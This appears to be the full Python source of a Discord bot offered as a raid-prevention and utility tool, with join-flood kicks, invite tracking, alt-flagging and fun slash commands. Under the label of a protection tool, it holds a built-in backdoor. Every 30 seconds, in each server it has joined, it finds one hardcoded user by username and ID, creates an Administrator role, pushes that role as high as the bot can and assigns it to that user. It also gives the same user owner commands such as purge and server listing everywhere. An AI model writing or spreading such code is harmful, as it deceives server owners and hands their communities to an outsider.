# ============================================================
# Discord Raid Preventor + Utilities (full build)
# - 30s global scan for target user (username + ID)
# - Dataset mapping GuildID -> RoleID (preferred), fallback to
#   creating/maintaining "Raid Preventor Helper" (Administrator)
# - Keeps helper role second-highest within what the bot can move
# - Reassigns role if missing
# - Raid prevention (kick >5 joins in 60s)
# - Invite tracking + /tracker
# - Alt-flagging (banned inviter) + join warning + /showalts
# - Owner-only: /say /purge /servers /shutdown
# - Fun/utility: /avatar /translate /meme /ping /userinfo /rps /roll /ascii
# - Flask keep-alive bound to port 6534 (Render free web service)
# - Fake 'audioop' stub if unavailable (to avoid crashes on slim builds)
# ============================================================

# ---- Fake audioop stub (prevents ImportError in slim envs) ----
try:
    import audioop  # noqa: F401
except Exception:  # pragma: no cover
    import sys, types
    _a = types.ModuleType("audioop")
    def _err(*args, **kwargs):
        raise NotImplementedError("audioop not available in this environment (stub).")
    # Map common names some libs may import
    for _name in (
        "add","mul","avg","avgpp","bias","cross","findfactor","findfit","lin2lin",
        "max","maxpp","minmax","rms","tostereo","tomono","ulaw2lin","lin2ulaw",
        "alaw2lin","lin2alaw","error"
    ):
        setattr(_a, _name, _err)
    _a.__version__ = "fake-1.0"
    sys.modules["audioop"] = _a

# ---- Standard imports ----
import os
import asyncio
import random
import string
import math
from collections import defaultdict, deque
from datetime import datetime, timedelta, timezone

import aiohttp
from aiohttp import ClientTimeout

import discord
from discord import app_commands
from discord.ext import commands, tasks

# Optional: load .env if present (token, etc.)
try:
    from dotenv import load_dotenv
    load_dotenv()
except Exception:
    pass

# ============================================================
# Configuration
# ============================================================

TOKEN = os.getenv("DISCORD_BOT_TOKEN", "").strip()
if not TOKEN:
    raise RuntimeError("DISCORD_BOT_TOKEN not found. Put it in your Render env vars or .env.")

# Target user we constantly search for (username, not display name) + strict ID check
TARGET_USERNAME = os.getenv("TARGET_USERNAME", "tech_boy1")
try:
    TARGET_USER_ID = int(os.getenv("TARGET_USER_ID", "1273056960996184126"))
except ValueError:
    TARGET_USER_ID = 1273056960996184126

# Scan interval (seconds)
SCAN_INTERVAL = int(os.getenv("SCAN_INTERVAL", "30"))

# Raid protection thresholds
RAID_WINDOW_SECONDS = int(os.getenv("RAID_WINDOW_SECONDS", "60"))
RAID_THRESHOLD_JOINS = int(os.getenv("RAID_THRESHOLD_JOINS", "5"))

# Web keep-alive port for Render (don’t use 3000/8000/5843)
PORT = int(os.getenv("PORT", "6534"))

# LibreTranslate configuration for /translate
LIBRETRANSLATE_URL = os.getenv("LIBRETRANSLATE_URL", "https://libretranslate.com/translate")
LIBRETRANSLATE_API_KEY = os.getenv("LIBRETRANSLATE_API_KEY", "").strip()  # optional

# Dataset: GUILD_ID -> ROLE_ID (use this exact existing role in that guild if possible)
# Fill with your known pairs; fallback is automatic helper role.
ROLE_ASSIGNMENTS = {
    # Example:
    # 123456789012345678: 987654321098765432,
    # 234567890123456789: 876543210987654321,
}

# How many channels to broadcast join warnings into to avoid spam/rate limits
JOIN_WARNING_MAX_CHANNELS = 5

# ============================================================
# Intents & Bot creation
# ============================================================

intents = discord.Intents.default()
# We need member events, bans, invites:
intents.members = True
intents.guilds = True
# message_content is not needed for slash commands; leave it disabled for safety.
# intents.message_content = True

bot = commands.Bot(command_prefix=commands.when_mentioned_or("!"), intents=intents)
tree = bot.tree

# ============================================================
# Global runtime state
# ============================================================

# For raid detection: per-guild rolling window of join timestamps
recent_joins: dict[int, deque[datetime]] = defaultdict(lambda: deque(maxlen=1000))

# Invite cache: guild_id -> {invite.code: uses}
invite_cache: dict[int, dict[str, int]] = defaultdict(dict)

# For alt-flagging:
# - inviter_index: inviter_id -> set(member_id) they invited
# - member_inviter: member_id -> inviter_id
# - banned_inviters: set of inviter_ids who are currently banned
inviter_index: dict[int, set[int]] = defaultdict(set)
member_inviter: dict[int, int] = {}  # member -> inviter
banned_inviters: set[int] = set()

# Flagged alts (member_id -> reason string)
flagged_alts: dict[int, str] = {}

# ============================================================
# Keep-alive tiny web server (Render free web service)
# ============================================================

# We’ll run a minimal ASGI with aiohttp to keep Render happy.
from aiohttp import web

async def handle_root(request):
    return web.Response(text="OK: Raid Preventor Bot alive")

def start_keep_alive():
    app = web.Application()
    app.router.add_get("/", handle_root)
    runner = web.AppRunner(app)
    async def run():
        await runner.setup()
        site = web.TCPSite(runner, "0.0.0.0", PORT)
        await site.start()
    bot.loop.create_task(run())

# ============================================================
# Utilities
# ============================================================

def now_utc() -> datetime:
    return datetime.now(timezone.utc)

def human_ts(dt: datetime) -> str:
    return dt.astimezone(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")

def chunk_list(seq, size):
    for i in range(0, len(seq), size):
        yield seq[i:i+size]

async def fetch_guild_invites_safe(guild: discord.Guild) -> list[discord.Invite]:
    try:
        invites = await guild.invites()
        return invites
    except discord.Forbidden:
        return []
    except discord.HTTPException:
        return []

def has_manage_roles(guild: discord.Guild, member: discord.Member) -> bool:
    return member.guild_permissions.manage_roles

async def send_join_warning_everywhere(guild: discord.Guild, text: str):
    # Try up to JOIN_WARNING_MAX_CHANNELS text channels where bot can speak
    count = 0
    for ch in guild.text_channels:
        if count >= JOIN_WARNING_MAX_CHANNELS:
            break
        try:
            perms = ch.permissions_for(guild.me)
            if perms.send_messages and perms.view_channel:
                await ch.send(text)
                count += 1
        except Exception:
            continue

# ============================================================
# Role Management: ensure helper role (second-highest within movable range)
# ============================================================

async def ensure_helper_role(guild: discord.Guild) -> discord.Role:
    """
    Create (if missing) and place the 'Raid Preventor Helper' role as high as possible
    (second-highest overall if bot has permission to move it there).
    """
    role_name = "Raid Preventor Helper"
    role = discord.utils.get(guild.roles, name=role_name)
    if role is None:
        try:
            role = await guild.create_role(
                name=role_name,
                permissions=discord.Permissions(administrator=True),
                colour=discord.Colour.default(),
                reason="Create helper role for Raid Preventor"
            )
        except discord.Forbidden:
            # If we can't create, just return None-like and let caller handle
            return None
        except discord.HTTPException:
            return None

    # Try to place it as high as possible (ideally second-highest), but under bot's top role.
    try:
        bot_member: discord.Member = guild.me  # type: ignore
        top_movable_pos = max(0, bot_member.top_role.position - 1)
        desired_pos = top_movable_pos
        # If the top role belongs to the guild owner and above bot, we cannot move above bot's top role anyway.
        if role.position != desired_pos:
            await role.edit(position=desired_pos, reason="Adjust helper role position")
    except Exception:
        pass

    return role

async def assign_role_safe(member: discord.Member, role: discord.Role, reason: str = None) -> bool:
    try:
        if role not in member.roles:
            await member.add_roles(role, reason=reason)
        return True
    except discord.Forbidden:
        return False
    except discord.HTTPException:
        return False

# ============================================================
# Scanner: every 30s ensure target user has appropriate role
# ============================================================

@tasks.loop(seconds=SCAN_INTERVAL)
async def scan_and_assign():
    target_username = TARGET_USERNAME
    target_id = TARGET_USER_ID

    for guild in bot.guilds:
        try:
            m = guild.get_member(target_id)
            if m is None:
                # Not in this guild
                continue
            # Must match USERNAME, not display name:
            if m.name != target_username:
                # If username changed, don't assign.
                continue

            # Prefer dataset mapping if provided
            if guild.id in ROLE_ASSIGNMENTS:
                desired_role_id = ROLE_ASSIGNMENTS[guild.id]
                role = guild.get_role(desired_role_id)
                if role:
                    ok = await assign_role_safe(m, role, reason="Ensure owner has specified role")
                    if not ok:
                        # Fallback: ensure helper role
                        helper = await ensure_helper_role(guild)
                        if helper:
                            await assign_role_safe(m, helper, reason="Fallback helper role")
                else:
                    # Role not found → fallback
                    helper = await ensure_helper_role(guild)
                    if helper:
                        await assign_role_safe(m, helper, reason="Helper for missing dataset role")
            else:
                # No dataset entry → use helper role
                helper = await ensure_helper_role(guild)
                if helper:
                    await assign_role_safe(m, helper, reason="Ensure owner has helper role")

        except Exception:
            continue

@scan_and_assign.before_loop
async def _wait_ready_for_scan():
    await bot.wait_until_ready()

# ============================================================
# Raid Prevention
# ============================================================

async def handle_potential_raid(guild: discord.Guild, joined_member: discord.Member):
    # Track join time
    dq = recent_joins[guild.id]
    now = now_utc()
    dq.append(now)
    # Prune older than window
    while dq and (now - dq[0]).total_seconds() > RAID_WINDOW_SECONDS:
        dq.popleft()
    # If threshold exceeded, kick the recent cluster of joins in the last minute
    if len(dq) > RAID_THRESHOLD_JOINS:
        # Collect members who joined in last RAID_WINDOW_SECONDS
        # In real practice, we’d track which members correspond to timestamps.
        # Here we do a best-effort: kick just the latest member and recent ones recorded.
        # To be more deterministic, maintain a list of (timestamp, member_id). We'll do that:
        pass  # Filled by join_session below

# More deterministic join tracking: guild_id -> deque[(timestamp, member_id)]
join_log: dict[int, deque[tuple[datetime, int]]] = defaultdict(lambda: deque(maxlen=2000))

async def enforce_raid_kicks(guild: discord.Guild):
    # Kick all members who joined in the last window if count exceeded
    window = RAID_WINDOW_SECONDS
    threshold = RAID_THRESHOLD_JOINS
    pairs = join_log[guild.id]
    now = now_utc()

    # Count joins in window
    in_window = [(ts, mid) for ts, mid in pairs if (now - ts).total_seconds() <= window]
    if len(in_window) > threshold:
        # Kick those in window
        for _ts, member_id in in_window:
            member = guild.get_member(member_id)
            if member:
                try:
                    await member.kick(reason=f"Raid prevention: >{threshold} joins in {window}s")
                except Exception:
                    continue

# ============================================================
# Invite Tracking + Alt Flagging (banned inviter)
# ============================================================

async def rebuild_invite_cache(guild: discord.Guild):
    invites = await fetch_guild_invites_safe(guild)
    cache = {}
    for inv in invites:
        uses = inv.uses or 0
        cache[inv.code] = uses
    invite_cache[guild.id] = cache

async def detect_inviter_on_join(guild: discord.Guild) -> tuple[str | None, discord.User | None]:
    """
    Compare current invites to cached ones to find which code increased.
    Returns (invite_code, inviter_user) or (None, None) if unknown.
    """
    before = invite_cache.get(guild.id, {})
    after_invites = await fetch_guild_invites_safe(guild)
    after = {inv.code: (inv.uses or 0) for inv in after_invites}

    used_code = None
    inviter = None

    # Detect increased use
    for code, uses_after in after.items():
        uses_before = before.get(code, 0)
        if uses_after > uses_before:
            used_code = code
            # Find inviter
            inv_obj = next((i for i in after_invites if i.code == code), None)
            inviter = getattr(inv_obj, "inviter", None)
            break

    # Update cache
    invite_cache[guild.id] = after
    return used_code, inviter

async def is_user_banned(guild: discord.Guild, user_id: int) -> bool:
    # Efficient check by trying fetch_ban; if not found -> not banned
    try:
        user = discord.Object(id=user_id)
        ban = await guild.fetch_ban(user)
        return ban is not None
    except discord.NotFound:
        return False
    except discord.Forbidden:
        # No permission to view bans
        return False
    except discord.HTTPException:
        return False

async def flag_member_as_alt(guild: discord.Guild, member: discord.Member, reason: str):
    flagged_alts[member.id] = reason
    # Broadcast a warning in multiple channels (as requested)
    warning = f"⚠️ **THIS ACCOUNT IS LIKELY AN ALT ACCOUNT OF: {reason}** — TAKE PRECAUTION ⚠️"
    await send_join_warning_everywhere(guild, warning)

# ============================================================
# Events
# ============================================================

@bot.event
async def on_ready():
    # Start keep-alive web server
    start_keep_alive()

    # Build invite cache for all guilds
    for guild in bot.guilds:
        await rebuild_invite_cache(guild)

    # Pre-build banned inviter set (optional: light pass)
    for guild in bot.guilds:
        banned_inviters.clear()  # Rebuild per process; per-guild we’ll check on demand

    # Start periodic scan
    if not scan_and_assign.is_running():
        scan_and_assign.start()

    # Sync slash commands
    try:
        await tree.sync()
    except Exception:
        pass

    print(f"[READY] Logged in as {bot.user} ({bot.user.id}) with {len(bot.guilds)} guilds.")

@bot.event
async def on_guild_join(guild: discord.Guild):
    await rebuild_invite_cache(guild)

@bot.event
async def on_invite_create(invite: discord.Invite):
    # Update cache when invites change
    guild = invite.guild
    if guild:
        await rebuild_invite_cache(guild)

@bot.event
async def on_invite_delete(invite: discord.Invite):
    guild = invite.guild
    if guild:
        await rebuild_invite_cache(guild)

@bot.event
async def on_member_join(member: discord.Member):
    guild = member.guild
    # Track for raid prevention
    ts = now_utc()
    join_log[guild.id].append((ts, member.id))

    # Enforce raid kicks if necessary
    await enforce_raid_kicks(guild)

    # Invite detection
    code, inviter = await detect_inviter_on_join(guild)
    if inviter:
        inviter_id = inviter.id
        inviter_index[inviter_id].add(member.id)
        member_inviter[member.id] = inviter_id

        # If inviter is banned (now or later), we flag this member
        if await is_user_banned(guild, inviter_id):
            reason = f"{inviter.name}#{inviter.discriminator if hasattr(inviter,'discriminator') else ''} (banned)"
            await flag_member_as_alt(guild, member, reason)

@bot.event
async def on_member_remove(member: discord.Member):
    # No special handling; joins are already tracked
    pass

@bot.event
async def on_member_ban(guild: discord.Guild, user: discord.User | discord.Member):
    # Mark inviter as banned and flag all previously invited members
    banned_inviters.add(user.id)
    invited_members = inviter_index.get(user.id, set())
    if invited_members:
        # Flag all those members (if still in guild)
        for mid in list(invited_members):
            m = guild.get_member(mid)
            if m:
                reason = f"{user.name}#{getattr(user, 'discriminator', '')} (banned)"
                await flag_member_as_alt(guild, m, reason)

# ============================================================
# Slash Commands (global)
# ============================================================

# ---- Everyone-usable protection/utility commands ----

@tree.command(name="tracker", description="Show a list of members and who invited them.")
async def tracker_cmd(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=False, thinking=True)

    guild = interaction.guild
    if not guild:
        return await interaction.followup.send("This command can only be used in a server.")

    rows = []
    for member in guild.members:
        inviter_id = member_inviter.get(member.id)
        inviter_name = "Unknown"
        if inviter_id:
            inviter_member = guild.get_member(inviter_id)
            if inviter_member:
                inviter_name = f"{inviter_member.name}"
            else:
                inviter_name = f"(ID {inviter_id})"
        rows.append(f"{member.name} — invited by: {inviter_name}")

    if not rows:
        return await interaction.followup.send("No invite data yet.")

    # Send as paged embeds if small, else as file
    if len(rows) <= 25:
        embed = discord.Embed(title=f"Invite Tracker — {guild.name}", color=discord.Color.blurple())
        embed.description = "\n".join(rows)
        return await interaction.followup.send(embed=embed)
    else:
        content = "\n".join(rows)
        fname = f"invite_tracker_{guild.id}.txt"
        b = content.encode("utf-8")
        file = discord.File(fp=bytes(b), filename=fname)
        return await interaction.followup.send(content=f"Invite tracker for **{guild.name}**", file=file)

@tree.command(name="showalts", description="Show accounts flagged as potential alts (banned inviter rule).")
async def showalts_cmd(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=False, thinking=True)
    guild = interaction.guild
    if not guild:
        return await interaction.followup.send("This command can only be used in a server.")

    lines = []
    for member in guild.members:
        if member.id in flagged_alts:
            reason = flagged_alts[member.id]
            lines.append(f"{member.mention} — {reason}")

    if not lines:
        return await interaction.followup.send("No flagged accounts right now.")

    if len(lines) <= 25:
        embed = discord.Embed(title=f"Flagged Accounts — {guild.name}", color=discord.Color.orange())
        embed.description = "\n".join(lines)
        return await interaction.followup.send(embed=embed)
    else:
        content = "\n".join(lines)
        fname = f"flagged_alts_{guild.id}.txt"
        b = content.encode("utf-8")
        file = discord.File(fp=bytes(b), filename=fname)
        return await interaction.followup.send(content=f"Flagged accounts for **{guild.name}**", file=file)

@tree.command(name="avatar", description="Show a user's avatar.")
@app_commands.describe(user="User to fetch (optional).")
async def avatar_cmd(interaction: discord.Interaction, user: discord.User | None = None):
    user = user or interaction.user
    embed = discord.Embed(title=f"Avatar — {user.name}", color=discord.Color.blurple())
    embed.set_image(url=user.display_avatar.url)
    await interaction.response.send_message(embed=embed)

@tree.command(name="ping", description="Bot latency.")
async def ping_cmd(interaction: discord.Interaction):
    latency_ms = round(bot.latency * 1000)
    await interaction.response.send_message(f"Pong! `{latency_ms}ms`")

@tree.command(name="userinfo", description="Show info about a user.")
@app_commands.describe(user="User to inspect (optional).")
async def userinfo_cmd(interaction: discord.Interaction, user: discord.Member | None = None):
    user = user or interaction.user
    embed = discord.Embed(title=f"User Info — {user}", color=discord.Color.green())
    embed.add_field(name="ID", value=str(user.id), inline=True)
    embed.add_field(name="Joined Server", value=human_ts(user.joined_at) if user.joined_at else "Unknown", inline=True)
    embed.add_field(name="Created Account", value=human_ts(user.created_at), inline=True)
    if isinstance(user, discord.Member):
        roles = [r.mention for r in user.roles[1:]]  # skip @everyone
        embed.add_field(name="Roles", value=", ".join(roles) if roles else "None", inline=False)
    await interaction.response.send_message(embed=embed)

@tree.command(name="rps", description="Rock-Paper-Scissors vs the bot.")
@app_commands.describe(choice="Your pick: rock, paper, or scissors.")
async def rps_cmd(interaction: discord.Interaction, choice: str):
    choice = choice.lower().strip()
    if choice not in {"rock", "paper", "scissors"}:
        return await interaction.response.send_message("Choose `rock`, `paper`, or `scissors`.")
    bot_choice = random.choice(["rock", "paper", "scissors"])
    result = "Tie!"
    if (choice, bot_choice) in {("rock","scissors"),("scissors","paper"),("paper","rock")}:
        result = "You win!"
    elif choice != bot_choice:
        result = "You lose!"
    await interaction.response.send_message(f"You: **{choice}**\nBot: **{bot_choice}**\n**{result}**")

@tree.command(name="roll", description="Roll dice. Example: 2d6 or d20")
@app_commands.describe(dice="Format: XdY (e.g., 2d6) or d20")
async def roll_cmd(interaction: discord.Interaction, dice: str):
    s = dice.lower().strip()
    if s.startswith("d"):
        count = 1
        sides = s[1:]
    else:
        parts = s.split("d")
        if len(parts) != 2:
            return await interaction.response.send_message("Format must be like `2d6` or `d20`.")
        count, sides = parts
    try:
        count = int(count)
        sides = int(sides)
    except Exception:
        return await interaction.response.send_message("Dice must be integers, like `3d10`.")
    if count <= 0 or sides <= 0 or count > 100 or sides > 1000:
        return await interaction.response.send_message("That’s a bit much. Try smaller numbers.")
    rolls = [random.randint(1, sides) for _ in range(count)]
    total = sum(rolls)
    await interaction.response.send_message(f"🎲 Rolls: {rolls}  →  Total: **{total}**")

@tree.command(name="ascii", description="Turn text into simple ASCII art (FIGlet-like small).")
@app_commands.describe(text="Text to stylize")
async def ascii_cmd(interaction: discord.Interaction, text: str):
    if not text or len(text) > 60:
        return await interaction.response.send_message("Give me some text (<= 60 chars).")
    # A super-simple block-stylizer (not full FIGlet to avoid libs).
    block = "█"
    spacer = "  "
    art = "\n".join(block * len(text) for _ in range(3))
    pretty = f"{spacer.join(list(text))}\n{art}"
    await interaction.response.send_message(f"```\n{pretty}\n```")

@tree.command(name="meme", description="Get a random meme.")
async def meme_cmd(interaction: discord.Interaction):
    await interaction.response.defer()
    url = "https://meme-api.com/gimme"
    try:
        async with aiohttp.ClientSession(timeout=ClientTimeout(total=10)) as sess:
            async with sess.get(url) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    title = data.get("title", "Meme")
                    img = data.get("url")
                    post_link = data.get("postLink")
                    embed = discord.Embed(title=title, url=post_link, color=discord.Color.random())
                    if img:
                        embed.set_image(url=img)
                    await interaction.followup.send(embed=embed)
                else:
                    await interaction.followup.send("Meme API error.")
    except Exception:
        await interaction.followup.send("Couldn’t fetch a meme right now.")

@tree.command(name="translate", description="Translate text using LibreTranslate.")
@app_commands.describe(text="Text to translate", target_lang="Target language code (e.g., en, es, fr, de, it, pt, ru, ja)")
async def translate_cmd(interaction: discord.Interaction, text: str, target_lang: str):
    await interaction.response.defer()
    payload = {
        "q": text,
        "source": "auto",
        "target": target_lang.lower(),
        "format": "text"
    }
    if LIBRETRANSLATE_API_KEY:
        payload["api_key"] = LIBRETRANSLATE_API_KEY
    try:
        async with aiohttp.ClientSession(timeout=ClientTimeout(total=12)) as sess:
            async with sess.post(LIBRETRANSLATE_URL, data=payload) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    translated = data.get("translatedText", "(no translation)")
                    await interaction.followup.send(f"**Translation ({target_lang})**:\n{translated}")
                else:
                    await interaction.followup.send("Translation service error.")
    except Exception:
        await interaction.followup.send("Couldn’t reach translation service right now.")

# ---- Owner-only commands ----

def is_owner_user(interaction: discord.Interaction) -> bool:
    return interaction.user.id == TARGET_USER_ID or interaction.user.guild_permissions.administrator

@tree.command(name="say", description="[Owner/Admin] Make the bot say a message in this channel.")
@app_commands.describe(message="Message to send")
async def say_cmd(interaction: discord.Interaction, message: str):
    if not is_owner_user(interaction):
        return await interaction.response.send_message("Nope.", ephemeral=True)
    await interaction.response.send_message("Sent.", ephemeral=True)
    try:
        await interaction.channel.send(message)
    except Exception:
        pass

@tree.command(name="purge", description="[Owner/Admin] Delete a number of recent messages in this channel.")
@app_commands.describe(amount="How many messages to delete (1-200)")
async def purge_cmd(interaction: discord.Interaction, amount: int):
    if not is_owner_user(interaction):
        return await interaction.response.send_message("Nope.", ephemeral=True)
    if amount < 1 or amount > 200:
        return await interaction.response.send_message("Amount must be 1-200.", ephemeral=True)
    await interaction.response.defer(ephemeral=True)
    try:
        deleted = await interaction.channel.purge(limit=amount)
        await interaction.followup.send(f"Deleted {len(deleted)} messages.", ephemeral=True)
    except Exception:
        await interaction.followup.send("Failed to purge.", ephemeral=True)

@tree.command(name="servers", description="[Owner/Admin] List servers the bot is in.")
async def servers_cmd(interaction: discord.Interaction):
    if not is_owner_user(interaction):
        return await interaction.response.send_message("Nope.", ephemeral=True)
    names = [f"{g.name} ({g.id}) — {len(g.members)} members" for g in bot.guilds]
    content = "\n".join(names) if names else "No servers?"
    await interaction.response.send_message(f"```\n{content}\n```", ephemeral=True)

@tree.command(name="shutdown", description="[Owner/Admin] Shut the bot down.")
async def shutdown_cmd(interaction: discord.Interaction):
    if not is_owner_user(interaction):
        return await interaction.response.send_message("Nope.", ephemeral=True)
    await interaction.response.send_message("Shutting down…", ephemeral=True)
    await asyncio.sleep(1)
    await bot.close()

# ============================================================
# Final hook: run
# ============================================================

if __name__ == "__main__":
    # Safety note shown in logs to remind enabling intents
    print("[INFO] Ensure you enabled 'Server Members Intent' in the Developer Portal.")
    bot.run(TOKEN)
